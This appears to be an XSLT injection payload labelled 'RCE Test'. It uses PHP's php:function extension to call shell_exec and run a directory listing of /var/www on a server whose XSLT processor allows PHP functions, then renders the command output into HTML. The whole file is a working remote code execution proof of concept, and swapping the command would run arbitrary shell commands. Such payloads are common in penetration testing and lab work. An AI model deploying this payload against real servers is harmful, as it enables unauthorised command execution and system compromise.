<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html>
      <body>
        <h2>RCE Test: ls -la /var/www/html</h2>
        <pre>
          <xsl:value-of select="php:function('shell_exec', 'ls -la /var/www')" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
